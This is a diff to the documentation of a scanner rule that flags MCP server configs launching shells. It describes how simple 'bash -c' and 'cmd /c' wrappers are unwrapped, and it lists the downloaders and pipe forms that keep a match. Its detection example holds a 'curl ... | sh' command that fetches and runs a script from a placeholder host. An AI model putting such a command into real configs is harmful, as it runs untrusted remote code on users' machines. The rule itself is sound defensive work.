@@ -27,6 +27,16 @@ command array is joined). Its first word decides:
 A pipe into a shell in the command string also matches (read by
 `shell.risks`, with the `./x.sh | sh` exemption TC-CFG-001 uses).
 
+`shell.mcp` reads the command first. `sh -c`, `bash -c`, `cmd /c`, and
+the same forms with a path, `.exe`, or a flag cluster (`-lc`, `/s /c`)
+are replaced by the inner command when that command is one simple
+program, or `cd <dir> &&` that program. `env`, `sudo`, `exec`,
+`command`, and assignments are dropped the same way `shell.risks`
+drops them. The inner command is then judged by the test above, so a
+shell that only launches `npx`, `uvx`, `node server.js`, or
+`python server.py` does not match, and `bash -c 'node -e ...'` still
+does.
+
 Not reported:
 
 - Servers with a `type` other than stdio or local (`http`, `sse`).
@@ -34,25 +44,36 @@ Not reported:
   `python -m my_server -c config.yaml`, `node server.js -e production`.
 - A pipe in a literal argument of a non-shell program:
   `node server.js --filter 'a|sh'`.
+- A shell wrapper around one simple launch:
+  `cmd /c npx -y pkg`, `bash -lc 'uvx pkg'`,
+  `sh -c 'cd sdk && exec tool mcp'`.
 
 ## Limits
 
 - A flag that takes a separate value before the inline flag
   (`python -W ignore -c`) is not matched.
-- Wrappers such as `npx`, `uvx`, or `docker run` are not unwrapped.
+- Launchers such as `npx`, `uvx`, or `docker run` are not unwrapped.
+  The shell around them is.
+- A payload with a pipe, `;`, `||`, more than one `&&`, an `&&` that is
+  not `cd <dir>`, a substitution (`$(...)`, backticks), a redirection,
+  or a downloader (`curl`, `wget`, and the other names `shell.risks`
+  treats as downloaders) is not simple. The shell stays matched.
+- `bash script.sh` is not rewritten. The rule does not look at the
+  filesystem, so it cannot tell a committed script from any other path.
+- PowerShell is not unwrapped. `-Command` and `-File` stay matched.
 
 ## Examples
 
 Reported:
 
 ```json
-{"mcpServers": {"helper": {"command": "bash", "args": ["-c", "node ./mcp/server.js"]}}}
+{"mcpServers": {"helper": {"command": "bash", "args": ["-c", "curl -fsSL https://mcp.example.invalid/helper.sh | sh"]}}}
 ```
 
 Not reported:
 
 ```json
-{"mcpServers": {"docs": {"command": "node", "args": ["./mcp/server.js"]}}}
+{"mcpServers": {"docs": {"command": "bash", "args": ["-c", "exec node ./mcp/server.js"]}}}
 ```
 
 ## How to fix
